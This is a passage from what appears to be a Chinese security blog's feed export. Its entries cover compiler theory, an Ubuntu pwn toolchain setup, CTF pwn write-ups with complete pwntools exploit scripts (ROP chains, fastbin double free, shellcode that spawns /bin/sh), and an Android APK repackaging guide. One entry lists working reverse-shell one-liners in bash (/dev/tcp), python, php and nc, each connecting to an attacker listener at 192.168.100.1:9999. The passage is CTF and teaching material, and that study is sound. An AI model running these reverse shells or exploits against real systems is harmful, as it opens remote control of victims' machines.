    <content type="text"><![CDATA[语言处理器 常见的语言处理器有编译器和解释器. 编译器是一个读取以源语言编写的程序并把其翻译为一个等价的使用目标语言编写的程序(产生目标代码程序). 解释器是一个读取以源语言编写的程序并逐个语句的执行(不产生目标代码程序,只产生运行结果). 也有一些即时编译器(JIT)在运行中处理输入的前一刻将字节码翻译成目标语言再执行. 编译过程 词法分析 编译过程第一个步骤称为词法分析或扫描,词法分析器根据词法规则将源代码解析成有意义的词素的序列并生成对应的符号表.常用的词法规则用有限自动机描述. 对于每个词素,词法分析器输出形如&lt;token-name, attribute-value&gt;的词法单元,token-name是该词法单元的类型(如基本字/保留字,标识符,常数,算符和界符/分隔符),attribute-value是对应的符号或指向对应的符号(某些词法单元无属性值,例如:=). 语法分析 编译过程第二个步骤称为语法分析或解析,语法分析根据语法规则(利用有限自动机描述),把单词符号串分解成各类语法单位,如短语,子句,句子和程序等.常用的语法规则用上下文无关文法描述. 通过语法分析,确定整个输入串是否构成语法上正确的程序.同时产生一个语法树. 词法分析是一种线性分析,而语法分析是一种层次结构的分析. 语义分析 &amp; 中间代码生成 语义分析器使用语法树和符号表来检查语义,同时会收集类型信息来进行类型检查. 在编译的过程中编译器会产生多个中间表示形式,例如语法树和中间代码,中间代码是一种含义明确,便于处理的记号系统. 语义分析的同时会根据语义规则产生中间代码,典型的有四元式,三地址代码,间接三地址代码,逆波兰式,树形表示等.常用的语义规则用属性文法描述. 中间代码的优化和目标代码生成 编译器还会依据程序的等价变换原则对中间代码进行优化(公共子表达式的提取,强度削弱,删除无用代码),产生时间或空间上更良好的中间代码. 依赖于硬件系统结构和机器指令的含义将中间代码映射为目标代码. 目标代码有三种形式:汇编指令代码(需要进行汇编),绝对指令代码(可直接运行),可重新定位指令代码(需要链接). 编译程序的结构 编译程序由两部分组成:分析部分(前端)和综合部分(后端). 分析部分是与源语言有关但与目标机无关的那些部分,主要进行词法分析,语法分析,语义分析,中间代码生成和中间代码与目标机无关的优化,这个过程中也会产生相应的中间表示形式,并生成符号表. 综合部份根据中间代码生成目标程序,主要包括编译程序中与目标机有关的那些部分,也就是中间代码与目标机有关的优化和目标代码生成. 符号表 &amp; 纠错 符号表一直存在,用于记录变量的名字和信息,同时在编译的过程中不断补充类型等信息. 编译程序在各个阶段应诊断和报告源程序中的错误,包括词法错误,语法错误,语义错误等.编译程序应报告出错地点,并给出简明准确的提示信息. 遍 遍是对源程序或源程序的中间表示从头到尾扫描一次,一遍可以由若干个阶段完成,一个阶段也可以分为若干遍. 编译程序的生成 以机器代码和汇编语言为工具实现目标语言的编译器. 利用已经有的高级语言为工具实现目标语言的编译器. 移植即把一种机器上的编译程序移植到另一种机器上. 自编译方式. 编译程序自动生成:LEX,YACC. 程序设计语言 图灵奖的获得者Alan J. Perlis曾说:A language that doesn't affect the way you think about programming, is not worth knowing. 程序本质上是一定字符集上的字符串,主要是由语法和语义两方面定义(实际上包括三个方面:语法,语义,语用). 语法:一组规则,用它可以形成和产生一个合式(well-formed)的程序.这些规则一部分称为词法规则,另一部分称为语法规则.词法规则定义了单词符号的形成规则,而语法规则定义了语法单位的形成规则. 语义:一组规则,用它可以定义一个程序的意义,也就是定义了语言的单词符号和语法单位的意义.语义规则的形式描述方法:操作语义,指称语义,代数语义. 程序本质上是描述一定数据的处理过程,所以程序设计语言的基本功能是描述数据和对数据的运算. 数据类型通常包括三要素. 用于区别这种类型数据对象的属性. 这种类型的数据对象可以具有的值. 可以作用于这种类型的数据对象的操作. 符号串 字母表是符号的非空有穷集合.任何程序语言都有自己的字母表,一个程序语言只使用一个有限字符集作为字母表,用∑表示. ∑上的一个符号串(字)是指由∑中的符号所构成的一个有穷序列. 空字ε是∑上的一个符号串,空字ε是不包含任何符号的序列. 若x是∑上的符号串,而a是∑的元素,则xa是∑上的符号串. y是∑上的符号串,当且仅当它前两条导出. ∑*(Kleene闭包):表示∑上的所有字符串的全体,ε也在其中.Ф表示不含任何元素的空集{}. 设s是符号串. 前缀:移走s的尾部的零个或多于零个符号. 后缀:删去s的头部的零个或多于零个符号. 子串:从s中删去一个前缀和一个后缀. 子序列:从s中删去零个或多于零个符号(这些符号不要求是连续的). 逆转:将s中的符号按相反次序写出而得到的符号串. 长度:符号的数目. 真前缀,真后缀,真子串:x != s &amp; x != ε. 符号串的运算. x = ba,y = nana,xy = banana. x ^ 0 = ε,x ^ 1 = x,.... 符号串集合的运算. 闭包与正规闭包的区别在于,如果V中原来没有空字,则正规闭包会少一个空字. 文法 文法是一种形式规则,程序语言的语法规则是用文法来描述的,目前的程序语言一般用上下文无关的文法来描述. 几个基本概念. 非终结符:需进一步定义的符号,只是一个中间产物. 终结符:不需要再定义,是组成语言的基本符号. 开始符号:由该符号开始推导,例如:program. 产生式:由规则左部能产生规则右部,规则左部为非终结符号,例如:program -&gt; expr | program expr | empty. 上下文无关文法 推导 对于推导a =&gt; b,如果每一步都是对a中的最左非终结符进行替换的,则称为最左推导;如果每一步都是对a中的最右非终结符进行替换的,则称为最右推导.对某文法的同一句型存在不同的推导序列. 句型,句子和语言 假定G是一个文法,S是它的开始符号.如果S能推导出a,则称a是一个句型.仅含终结符的句型是一个句子.文法G所产生句子的全体是一个语言,将它记为:L(G). 文法和语言之间并不存在一一对应关系,对于一给定的文法,唯一地确定它所产生的语言;但对于一个给定的语言往往可用若干个不同的文法来产生. 化简了的文法:文法中不含有任何形如P -&gt; P的产生式;每个非终结符号P必须都有用处,即必须存在含P的句型,同时对于P不存在永不终结的回路. 语法树 画语法树的两种方法: 1. 最左推导,自顶向下,根据推导序列,对每步推导画相应分枝. 2. 最右推导,自底向上,根据归约序列,对每步归约画相应分枝. 分析树是推导的图形表示.一个句型推导或分析用一棵树结构图示出来,它反应了一个句子的语法结构层次. 若文法是无二义性的,对于一个句子的多种推导画出的分析树是一样的,分析树并未描述推导过程. 描述一个句子的文法不是唯一的,对于一个句子的分析应是唯一的. 二义性 如果一个文法的句子存在两棵不同的分析树,那么该句子是二义性的.如果一个文法包含二义性的句子,则称这个文法是二义性的;否则,该文法是无二义性的. 二义文法生成的语言L(G)不一定是二义的.因为对于一个语言来说,可以由多个文法生成,只要有一个生成该语言的文法不是二义的,该语言就不是二义的. 对于任意一个上下文无关文法,不存在一个算法,能够在有限的步骤内判定它是无二义性的;但能给出一组充分条件,满足这组充分条件的文法是无二义性的. 文法的分类 乔姆斯基文法有四种类型:0型,1型,2型,3型.它们都由四部分组成,但对产生式的限制有所不同. 由于四种文法是按照将产生式做进一步限制而定义的,所以它们之间是逐级包含的关系,由四种文法产生的语言也是逐级包含的关系.ps:0型语言除外,从其中删去或往其中添加一个空串并不改变其语言类. 在程序语言中,与词法有关的规则属于正规文法;与局部语法有关的规则属于上下文无关文法;而与全局语法和语义有关的部分往往要用上下文有关文法来描述. 自嵌套的文法. 文法的递归性.]]></content>
      <categories>
        <category>CS</category>
        <category>BASIC</category>
      </categories>
      <tags>
        <tag>compiler-principles</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[w4rd3n-ubuntu虚拟机环境搭建]]></title>
    <url>%2Fposts%2Fbd6da0ba%2F</url>
    <content type="text"><![CDATA[基础环境 apt换源 修改配置文件. 123sudo gedit /etc/apt/sources.listsudo apt-get update#sudo apt-get upgrade sources.list. 123456789101112131415161718#ubuntu16deb http://mirrors.ustc.edu.cn/ubuntu/ xenial main restricted universe multiversedeb http://mirrors.ustc.edu.cn/ubuntu/ xenial-security main restricted universe multiversedeb http://mirrors.ustc.edu.cn/ubuntu/ xenial-updates main restricted universe multiversedeb http://mirrors.ustc.edu.cn/ubuntu/ xenial-proposed main restricted universe multiversedeb http://mirrors.ustc.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse##ubuntu18deb https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse#ubuntu20deb https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse pip换源 123mkdir ~/.piptouch ~/.pip/pip.confgedit ~/.pip/pip.conf ~/.pip/pip.conf. 12[global]index-url = https://pypi.mirrors.ustc.edu.cn/simple 工具 12345sudo apt-get purge libreoffice-common unity-webapps-common thunderbird totem rhythmbox empathy brasero simple-scan gnome-mahjongg aisleriot gnome-mines cheese gnome-sudoku transmission-common gnome-orca webbrowser-app landscape-client-ui-install deja-dupsudo apt-get install python3-pip gdb git vim tmux socat python g++ python-pip python3 gdebi synapticsudo apt install traceroutesudo apt install python-pip --reinstallpip install --upgrade pip 常用工具:vscode. docker 12345678910sudo apt-get remove docker docker-engine docker.io containerd runcsudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-commoncurl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -sudo add-apt-repository "deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable"sudo apt-get updatesudo apt-get install docker-ce docker-ce-cli containerd.iosudo vim /etc/docker/daemon.json# &#123;"registry-mirrors": ["https://docker.mirrors.ustc.edu.cn"]&#125;sudo systemctl start dockersudo systemctl enable docker 常用动态库 1234567sudo apt-get install apt-filesudo apt-file update#apt-file search libcrypto.so.1.0.0sudo apt-get install libssl1.0.0 libssl1.0.0:i386sudo apt-get install libncurses5-dev libssl-devsudo apt-get install libpixman-1-devsudo apt-get install libseccomp-dev libseccomp2 seccomp 二进制环境配置 x86 64位系统编译和运行32位程序需要另装库. 1sudo apt-get install gcc-multilib libc6:i386 调试工具 https://github.com/hugsy/gef. 123git clone -b stable https://github.com/pwndbg/pwndbgcd pwndbgsudo ./setup.sh 12git clone https://github.com/longld/peda.git ~/pedaecho "source ~/peda/peda.py" &gt;&gt; ~/.gdbinit 调试其他架构程序. 1sudo apt-get install gdb-multiarch pwntools 推荐使用python2版本. 1sudo pip install pwntools 1234sudo apt-get updatesudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essentialsudo python3 -m pip install --upgrade pipsudo python3 -m pip install --upgrade pwntools qume 下载最新版源码安装. 12./configuresudo make install -j20 1sudo apt-get install -y qemu-kvm gcc 有些老版本内核使用新版本gcc可能编译不过. 1234sudo apt-get install gcc-4.7sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-4.7 40sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-5 50sudo update-alternatives --config gcc 常用工具 123456789101112131415161718#sudo add-apt-repository ppa:brightbox/ruby-ng#删除:sudo add-apt-repository -r ppa:brightbox/ruby-ng#sudo apt-get update#sudo apt-get install ruby2.6 ruby2.6-devsudo apt-get install ruby ruby-devsudo gem install one_gadget seccomp-toolssudo pip install setuptools --upgradesudo pip3 install setuptools --upgradesudo pip3 install liefsudo apt-get install binwalksudo apt install musl-toolsgit clone https://github.com/niklasb/libc-database.gitgit clone https://github.com/maroueneboubakri/lscan.git 多架构 123456sudo apt-get install "binfmt*"#binfmt用来识别多架构文件类型sudo apt-get install gcc-arm-linux-gnueabi g++-arm-linux-gnueabi gcc-aarch64-linux-gnu g++-aarch64-linux-gnu gcc-arm-linux-gnueabihf g++-arm-linux-gnueabihf#ARM/AARCH64运行环境+交叉编译链sudo apt-get install linux-libc-dev-mips-cross libc6-mips-cross libc6-dev-mips-cross binutils-mips-linux-gnu gcc-mips-linux-gnu g++-mips-linux-gnu#MIPS运行环境+交叉编译链 v8环境配置 配置git代理. 12git config --global http.proxy http://192.168.235.1:1080#关闭代理:git config --global --unset http.proxy 配置环境变量. 1234export http_proxy="http://192.168.235.1:1080"export https_proxy=$http_proxy#echo 'export http_proxy="http://192.168.235.1:1080"' &gt;&gt; ~/.bashrc#echo 'export https_proxy=$http_proxy' &gt;&gt; ~/.bashrc 下载工具. 123456git clone https://chromium.googlesource.com/chromium/tools/depot_tools.gitecho 'export PATH=$PATH:"$HOME/depot_tools"' &gt;&gt; ~/.bashrcgit clone https://github.com/ninja-build/ninja.gitcd ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; cd ..echo 'export PATH=$PATH:"$HOME/ninja"' &gt;&gt; ~/.bashrc 编译v8. 1fetch v8 &amp;&amp; cd v8 123456789gclient sync#更新git reset --hard [commit hash with vulnerability]#切换版本tools/dev/v8gen.py x64.debugninja -C out.gn/x64.debug [d8]#d8参数表示只编译d8#debug-&gt;release编译release版本 启动. 1234567./out.gn/x64.release/d8#启动d8交互shell./out.gn/x64.release/d8 test.js#运行test.js./out.gn/x64.debug/d8./out.gn/x64.debug/shell./out.gn/x64.debug/d8 test.js 调试工具. 12echo 'source /home/w4rd3n/v8/tools/gdbinit' &gt;&gt; ~/.gdbinitecho 'source /home/w4rd3n/v8/tools/gdb-v8-support.py' &gt;&gt; ~/.gdbinit crypto环境 python库 1234sudo apt-get install libmpfr-dev libgmp-dev libmpc-devsudo pip install pycrypto rsa sympy z3-solver pyDes libnum gmpy2sudo pip3 install pycrypto rsa sympy z3-solver pyDes libnum gmpy2 sage 1234567sudo apt-get install m4tar xvf sage-x.y.tar.gzcd sage-x.y./configure --prefix=/home/w4rd3n/Desktop/sage-9.1make -j8ln -s /path/to/sage-x.y/sage /usr/local/bin/sage]]></content>
      <categories>
        <category>w4rd3n</category>
      </categories>
      <tags>
        <tag>environment</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-nctf-2019-quals-pwn]]></title>
    <url>%2Fposts%2F7b4f1cc3%2F</url>
    <content type="text"><![CDATA[easy_rop 考点 scanf %d的特殊情况. stack pivot. exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *def leak(): r.recvuntil(": ") r.sendline("+") r.recvuntil(" = ") data1 = int(r.recvline()) if data1 &lt; 0: data1 = data1 + 0x100000000 r.recvuntil(": ") r.sendline("+") r.recvuntil(" = ") data2 = int(r.recvline()) if data2 &lt; 0: data2 = data1 + 0x100000000 return data2 * 0x100000000 + data1def set(val): r.recvuntil(": ") r.sendline(str(val % 0x100000000)) r.recvuntil(": ") r.sendline(str(val / 0x100000000))r = process("./easy_rop")leak_list = []for i in range(15): leak_list.append(leak()) print hex(leak_list[i])pie = leak_list[14] - 0x5570b84d6b40 + 0x5570b84d6000set(pie + 0xb9d)set(pie + 0x201408)r.recvuntil("What's your name?\n")payload = p64(pie + 0xba3) + p64(1) + p64(pie + 0xba1) + p64(pie + 0x201238) + p64(0) + p64(pie + 0x820)payload += p64(pie + 0xba3) + p64(0) + p64(pie + 0xba1) + p64(pie + 0x201238) + p64(0) + p64(pie + 0x850)payload += p64(pie + 0x810)r.send(payload)libc = u64(r.recv(8)) + 0x7fd4b593c000 - 0x7fd4b59ab690r.send(p64(libc + 0x4526a))print "pie: " + hex(pie)print "libc: " + hex(libc)r.interactive() 遇到的问题 本地跑,栈迁移之后使用puts后再使用read会发现read调用失败,原因未知,改用write. easy_heap 考点 double free. 构造fake_fastbin_chunk_header. exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *def add(size, content): r.sendline("1") r.sendlineafter("What's your heap_size?\n", str(size)) r.sendafter("What's your heap_content?\n", content) r.recvuntil("4. exit\n")def dele(index): r.sendline("2") r.sendlineafter("What's your heap_index?\n", str(index)) r.recvuntil("4. exit\n")def show(index): r.sendline("3") r.sendlineafter("What's your heap_index?\n", str(index)) r.recvuntil(": ") data = r.recvline()[:-1] r.recvuntil("4. exit\n") return datar = process("./easy_heap")r.recvline("What's your name?\n")r.send(p64(0) + p64(0x61))r.recvuntil("4. exit\n")add(0x50, "w4rd3n")#0add(0x50, "w4rd3n")#1dele(0)dele(1)dele(0)add(0x50, p64(0x602060))add(0x50, "w4rd3n")add(0x50, "w4rd3n")add(0x50, p64(0) * 1 + p64(0xfffffffffffffff) + p64(0x601FB0) + p64(0) * 7)libc = u64(show(0).ljust(8, "\x00")) + 0x7f26f36a5000 - 0x7f26f3714690add(0x60, "w4rd3n")#1add(0x60, "w4rd3n")#2dele(1)dele(2)dele(1)add(0x60, p64(libc + 0x3c4b10 - 0x23))#3add(0x60, "w4rd3n")#4add(0x60, "w4rd3n")#5add(0x60, "0" * 0x13 + p64(libc + 0x45390))gdb.attach(r)print "libc: " + hex(libc)r.sendline("1")r.sendlineafter("What's your heap_size?\n", str(libc + 0x18cd57))r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-pwn-collection]]></title>
    <url>%2Fposts%2F2a0373b8%2F</url>
    <content type="text"><![CDATA[shellcode jmp $与lea 题目让用户输入shellcode,然后用0xcc(int 3)分隔shellcode,留下空间分别为4,5,9,并清零rip外的寄存器. 短跳转jmp $ + n指令长度为2,使用其绕过0xcc.使用lea [rip + n]新建栈和其他参数. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *context.log_level = "debug"context.arch = "amd64"context.os = "linux"#context.aslr = Falser = process("./pwn")#gdb.attach(r, "b * 0x555555554a06\nc")#print len(asm("mov al, 59", arch = "amd64", os = "linux"))shellcode = asm("mov dl, 0xff; jmp $ + 9", arch = "amd64", os = "linux")shellcode = shellcode.ljust(9, "a")shellcode += asm("lea rsi, [rip - 0x12]", arch = "amd64", os = "linux")shellcode += asm("jmp $ + 3", arch = "amd64", os = "linux")shellcode += asm("syscall", arch = "amd64", os = "linux")r.sendafter("Give me your code:\n", shellcode.ljust(26, "a"))sleep(0.1)shellcode = ''' lea rsp, [rip - 0x18] push 0x68 mov rax, 0x732f2f2f6e69622f push rax mov rdi, rsp push 0x1010101 ^ 0x6873 xor dword ptr [rsp], 0x1010101 xor esi, esi push rsi push 8 pop rsi add rsi, rsp push rsi mov rsi, rsp xor edx, edx push 59 pop rax syscall'''shellcode = "a" * 0x17 + asm(shellcode)r.send(shellcode)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-buuctf]]></title>
    <url>%2Fposts%2F7d8dc2a1%2F</url>
    <content type="text"><![CDATA[pwn ciscn_2019_en_2 \x00截断即可. 12345678910111213141516171819202122232425262728293031323334from pwn import *context.log_level = "debug"# r = process("./ciscn_2019_en_2")r = remote("node3.buuoj.cn", "26976")r.recvuntil("Input your choice!\n")r.sendline("1")r.recvuntil("be encrypted\n")payload = "\x00" * 0x58payload += p64(0x400c83) + p64(0x602020) + p64(0x4006E0)payload += p64(0x400790)r.sendline(payload)r.recvline()r.recvline()libc = u64(r.recvline()[:-1].ljust(8, "\x00")) - 0x809c0r.recvuntil("Input your choice!\n")r.sendline("1")r.recvuntil("be encrypted\n")payload = "\x00" * 0x58payload += p64(0x400c83) + p64(libc + 0x1b3e9a) + p64(libc + 0x4f440)payload += p64(0x400c83) + p64(libc + 0x1b3e9a) + p64(libc + 0x4f440)#加了一行是因为上面那次调用貌似被干掉了payload += p64(0x400790)r.sendline(payload)print "libc: " + hex(libc)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-redhat-2019-finals]]></title>
    <url>%2Fposts%2Fa1b93287%2F</url>
    <content type="text"><![CDATA[粤湾证券 纯逆向,xctf final上有类似的题,不过这里由于靶机不会patch,所以失去了对抗的效果. 1234567891011121314151617181920212223242526272829303132333435from pwn import *import base64context.log_level = 'debug'# context.aslr = Falsefd = open("/defense", "wb")# fd.write(p64(0x20) + "system".ljust(8, "\x00") + p64(0))# fd.write(p64(0x20) + "execve".ljust(8, "\x00") + p64(0))# fd.write(p64(0x20) + "open".ljust(8, "\x00") + p64(0))# fd.write(p64(0x20) + "free".ljust(8, "\x00") + p64(0))# fd.write(p64(0x20) + "malloc".ljust(8, "\x00") + p64(0))fd.close()# r = process("./pwn")r = remote("172.16.9.41", "9002")r.recvuntil("gift:")libc = int(r.recvline(), 16)bin_sh_offset = 0x1b3e9a#0x18cd57payload = p64(0x10) + "\x00".ljust(8, "\x00") + p64(libc + bin_sh_offset)payload += p64(0x40) + "system".ljust(8, "\x00") + p64(0)payload = base64.b64encode(payload)# bp = "b * 0x19b7 + 0x555555554000\n"# bp += "b * 0x157A + 0x555555554000\n"# bp += "b * 0x1170 + 0x555555554000\n"# gdb.attach(r, bp + "c")r.send(payload)r.interactive() 粤湾银行 纯逆向,相当于定义了一堆操作码,然后通过shellcode获取shell,主要过程在于读懂程序逻辑. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from pwn import *context.log_level = 'debug'#context.aslr = Falsedef new(content): r.sendafter("&gt;&gt;&gt; ", "1" + p64(0)) r.send(content) data = r.recvline() return datadef play(): r.sendafter("&gt;&gt;&gt; ", "2" + p64(0))def dele(): r.sendafter("&gt;&gt;&gt; ", "3" + p64(0))# r = process("./pwn", env = &#123;"LD_PRELOAD" : "./libc32.so"&#125;)r = remote("172.16.9.41", "9003")payload = p8(0x73) + p32(0x804B028)payload += p8(0x40) + p8(0x03) + p8(0x4a)payload += p8(0x10) + p8(0x01)payload += p8(0x20) + p8(0x03)payload += p8(0x10) + p8(0x01)payload += p8(0x20) + p8(0x03)payload += p8(0x10) + p8(0x01)payload += p8(0x20) + p8(0x03)payload += p8(0x10) + p8(0x01)print new(payload + p8(0xb0))play()libc = u8(r.recv(1))libc += u8(r.recv(1)) * 0x100libc += u8(r.recv(1)) * 0x10000libc += u8(r.recv(1)) * 0x1000000system = libc + 0x2a906940 - 0x2a92b140payload = p8(0x73) + p32(0x804B018)payload += p8(0x40) + p8(0x03) + p8(0x4a)payload += p8(0x10) + p8(0x00)payload += p8(0x20) + p8(0x03)payload += p8(0x10) + p8(0x00)payload += p8(0x20) + p8(0x03)payload += p8(0x10) + p8(0x00)payload += p8(0x20) + p8(0x03)payload += p8(0x10) + p8(0x00)payload += p8(0x43) + p8(0) + "/bin"payload += p8(0x43) + p8(1) + "/sh\x00"print new(payload + p8(0xb0))play()r.send(p32(system))# bp = "b * 0x8048743\n"# gdb.attach(r, bp + "c")print "system: " + hex(system)r.interactive() 粤湾中心 先逆向逻辑,通过整数溢出(也不算)读取到bss段数据,使用了dup2将flag文件的描述符复制,所以读取stdin覆盖stack指针然后push覆盖fileno输出flag. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081from pwn import *context.log_level = 'debug'#context.aslr = Falser = process("./pwn")r.sendlineafter("EIP: ", "0")r.sendlineafter("ESP: ", "27")code = ""code += str((0x40 &lt;&lt; 16) + (1 &lt;&lt; 8) + 5) + "\n"#reg[1] = 5code += str((0xD0 &lt;&lt; 16) + (0 &lt;&lt; 8) + 1) + "\n"#reg[0] -= reg[1] = -5code += str((0x40 &lt;&lt; 16) + (1 &lt;&lt; 8) + 4) + "\n"#reg[1] = 4code += str((0xC0 &lt;&lt; 16) + (0 &lt;&lt; 8) + 1) + "\n"#reg[0] *= reg[1] = -20code += str((0x40 &lt;&lt; 16) + (1 &lt;&lt; 8) + 2) + "\n"#reg[1] = 2code += str((0x42 &lt;&lt; 16) + (1 &lt;&lt; 8) + 0) + "\n"#reg[reg[1]] = data[reg[0]] &lt;=&gt; reg[2] = data[-20]code += str((0x40 &lt;&lt; 16) + (1 &lt;&lt; 8) + 1) + "\n"#reg[1] = 1code += str((0xA0 &lt;&lt; 16) + (0 &lt;&lt; 8) + 1) + "\n"#reg[0] += 1 = -19code += str((0x40 &lt;&lt; 16) + (1 &lt;&lt; 8) + 3) + "\n"#reg[1] = 3code += str((0x42 &lt;&lt; 16) + (1 &lt;&lt; 8) + 0) + "\n"#reg[reg[1]] = data[reg[0]] &lt;=&gt; reg[3] = data[-19]code += str((0x40 &lt;&lt; 16) + (7 &lt;&lt; 8) + 8) + "\n"#reg[7] = 8code += str((0xD0 &lt;&lt; 16) + (6 &lt;&lt; 8) + 7) + "\n"#reg[6] -= reg[7] = -8code += str((0x40 &lt;&lt; 16) + (7 &lt;&lt; 8) + 2) + "\n"#reg[7] = 2code += str((0xD0 &lt;&lt; 16) + (6 &lt;&lt; 8) + 7) + "\n"#reg[6] -= reg[7] = -10code += str((0x40 &lt;&lt; 16) + (7 &lt;&lt; 8) + 4) + "\n"#reg[7] = 4code += str((0x41 &lt;&lt; 16) + (6 &lt;&lt; 8) + 2) + "\n"#data[reg[6]] = reg[2]code += str((0x40 &lt;&lt; 16) + (7 &lt;&lt; 8) + 1) + "\n"#reg[7] = 1code += str((0xA0 &lt;&lt; 16) + (6 &lt;&lt; 8) + 7) + "\n"#reg[6] += 1 = -9code += str((0x41 &lt;&lt; 16) + (6 &lt;&lt; 8) + 3) + "\n"#data[reg[6]] = reg[3]#19code += str((0x40 &lt;&lt; 16) + (0 &lt;&lt; 8) + 8) + "\n"#reg[0] = 8code += str((0x40 &lt;&lt; 16) + (1 &lt;&lt; 8) + 8) + "\n"#reg[1] = 8code += str((0xC0 &lt;&lt; 16) + (0 &lt;&lt; 8) + 1) + "\n"#reg[0] *= reg[1] = 64code += str((0xC0 &lt;&lt; 16) + (0 &lt;&lt; 8) + 1) + "\n"#reg[0] *= reg[1] = 512code += str((0x40 &lt;&lt; 16) + (2 &lt;&lt; 8) + 6) + "\n"#reg[2] = 6code += str((0xC0 &lt;&lt; 16) + (2 &lt;&lt; 8) + 1) + "\n"#reg[2] *= reg[1] = 48code += str((0x40 &lt;&lt; 16) + (1 &lt;&lt; 8) + 3) + "\n"#reg[1] = 3code += str((0xA0 &lt;&lt; 16) + (2 &lt;&lt; 8) + 1) + "\n"#reg[2] += 3 = 51code += str((0xA0 &lt;&lt; 16) + (0 &lt;&lt; 8) + 2) + "\n"#reg[0] += 51 = 563code += str((0x70 &lt;&lt; 16) + (0 &lt;&lt; 8) + 0) + "\n"#push 563#29r.sendlineafter("Give me code length: \n", "29")gdb.attach(r)r.sendafter("Give me code: \n", code)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-web-penetration-反弹shell]]></title>
    <url>%2Fposts%2Fff2be538%2F</url>
    <content type="text"><![CDATA[概念 攻击者指定服务端,受害者主机主动连接攻击者的服务端程序,就叫反弹shell,通常用于被控端因防火墙受限,权限不足,端口被占用等情形. 反弹shell命令 外网主机监听端口. 123nc -lvvp 9999 -t -e /bin/bash#-t:tcp#-e:运行程序 目标机运行一下命令连接,注意需要设置防火墙. bash版本.由解析shell的bash完成,所以某些情况下不支持. 12345bash -i &gt;&amp; /dev/tcp/192.168.100.1/9999 0&gt;&amp;1#bash -i:产生bash交互环境#&gt;&amp;:将前面的内容与后面结合并重定向到后者#/dev/tcp/192.168.100.1/9999:Linux一切皆文件,这里表示建立一个到192.168.100.1:9999的tcp连接#0&gt;&amp;1:将标准输入重定向给标准输出 python版本. 1python -c 'import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("192.168.100.1", 9999)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = subprocess.call(["/bin/sh", "-i"]);' php版本. 1php -r '$sock = fsockopen("192.168.100.1", 9999); exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' nc版本. 1nc -t -e /bin/sh 192.168.100.1 9999 1rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.100.1 9999 &gt;/tmp/f 1nc 192.168.100.1 2333 | /bin/sh | nc 192.168.100.1 9999]]></content>
      <categories>
        <category>IS</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>penetration</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-reverse-Android-基础]]></title>
    <url>%2Fposts%2Fa4257a9b%2F</url>
    <content type="text"><![CDATA[APK APK是一种归档文件,实质就是一个特殊的zip.内容主要有:应用模块,也就是源代码,资源文件,aidl接口文件.还有就是依赖模块即第三方依赖库,aar,jar,so文件. 首先打包资源文件生成R.java,编译aidl生成java接口文件,将源代码编译成dex(Dalvik Executable,Android系统为每一个APP创建一个Dalvik虚拟机)文件,最后将编译后的文件打包成一个APK压缩包. 使用到的工具:aapt.exe/aapt2.exe,资源打包工具;javac.exe,将java转成class;dx.jar,将class转成dex文件. 逆向APK 破解流程:反编译apk,定位关键代码,功能分析,smali修改,重打包,签名,安装. 12345678910apktool d test.apk#反编译#...#修改smaliapktool b test#回编译keytool -genkey -alias my.keystore -keyalg RSA -validity 20000 -keystore my.keystore#生成签名文件jarsigner -verbose -keystore my.keystore -signedjar test_signed.apk test.apk my.keystore#对apk签名 反编译常用工具:apktool,jeb,smali/baksmali,AndroidKiller等. AndroidManifest.xml文件用于活动的声明与权限的描述.定位关键代码一般通过:资源引用法,猜测法,交叉引用法.然后分析代码明白程序功能. 动态调试 如果使用夜神模拟器,进入到夜神安装bin目录下. 1nox_adb.exe connect 127.0.0.1:62001 首先反编译apk,在AndroidManifest.xml的application中添加可调试属性android:debuggable="true". 修改后回编译并签名,反编译后的文件夹是加载到android 